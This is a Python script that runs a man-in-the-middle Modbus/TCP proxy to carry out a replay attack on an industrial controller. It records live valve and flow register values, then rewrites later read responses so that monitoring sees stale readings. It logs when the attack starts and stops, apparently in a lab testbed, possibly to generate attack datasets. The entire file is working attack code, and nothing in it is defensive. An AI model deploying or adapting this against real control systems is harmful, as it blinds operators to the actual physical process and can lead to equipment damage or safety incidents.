import socket, struct, threading, time, csv, datetime, os

LISTEN = ("0.0.0.0", 502)
TARGET = ("192.168.95.2", 502)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

attack = {"active": False}
recording = []   # list of (valve_raw, flow_raw) pairs
replay_idx = {"i": 0}
log_rows = []

def recvn(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def recv_frame(sock):
    hdr = recvn(sock, 7)
    if hdr is None:
        return None
    length = struct.unpack(">H", hdr[4:6])[0]
    body = recvn(sock, length - 1)
    return hdr + (body or b"")

def maybe_rewrite(req, resp):
    if not attack["active"] or not recording:
        return resp
    if req[7] != 4:
        return resp
    start = struct.unpack(">H", req[8:10])[0]
    count = struct.unpack(">H", req[10:12])[0]
    # only touch reads that include 106 and/or 107
    if not (start <= 106 < start + count or start <= 107 < start + count):
        return resp

    valve_raw, flow_raw = recording[replay_idx["i"] % len(recording)]
    replay_idx["i"] += 1

    resp = bytearray(resp)
    if start <= 106 < start + count:
        pos = 9 + (106 - start) * 2
        resp[pos:pos+2] = struct.pack(">H", valve_raw & 0xFFFF)
    if start <= 107 < start + count:
        pos = 9 + (107 - start) * 2
        resp[pos:pos+2] = struct.pack(">H", flow_raw & 0xFFFF)

    log_rows.append([datetime.datetime.utcnow().isoformat(), valve_raw, flow_raw])
    return bytes(resp)

def handle(client):
    up = socket.create_connection(TARGET)
    try:
        while True:
            req = recv_frame(client)
            if req is None:
                break
            up.sendall(req)
            resp = recv_frame(up)
            if resp is None:
                break
            resp = maybe_rewrite(req, resp)
            client.sendall(resp)
    finally:
        client.close(); up.close()

def serve():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(LISTEN); s.listen(1)
    print("proxy up on", LISTEN, "->", TARGET)
    while True:
        c, _ = s.accept()
        threading.Thread(target=handle, args=(c,), daemon=True).start()

def read_pair(sock, unit=1):
    req = struct.pack(">HHHBBHH", 1, 0, 6, unit, 4, 106, 2)
    sock.sendall(req)
    resp = recv_frame(sock)
    valve_raw = struct.unpack(">H", resp[9:11])[0]
    flow_raw = struct.unpack(">H", resp[11:13])[0]
    return valve_raw, flow_raw

def record(seconds):
    print(f"recording live valve+flow pairs for {seconds}s...")
    probe = socket.create_connection(TARGET)
    t_end = time.time() + seconds
    while time.time() < t_end:
        recording.append(read_pair(probe))
        time.sleep(1.0)
    probe.close()
    print(f"recorded {len(recording)} pairs, e.g. first={recording[0]} last={recording[-1]}")

if __name__ == "__main__":
    threading.Thread(target=serve, daemon=True).start()
    time.sleep(0.5)

    record(30)  # capture 30 real seconds of valve-flow pairs before attacking

    input("Press Enter to START replay attack on ProductValve+ProductFlow (106,107)...")
    onset = datetime.datetime.utcnow().isoformat()
    replay_idx["i"] = 0
    attack["active"] = True
    print("ATTACK ACTIVE at", onset)

    input("Press Enter to STOP the attack...")
    attack["active"] = False
    offset = datetime.datetime.utcnow().isoformat()
    print("ATTACK STOPPED at", offset)

    log_path = "/app/data/attack_log_replay.csv"
    with open(log_path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["timestamp_utc", "valve_raw", "flow_raw"])
        w.writerows(log_rows)
    print(f"onset={onset} offset={offset}, {len(log_rows)} tampered responses logged")
    print(f"log written to {log_path}")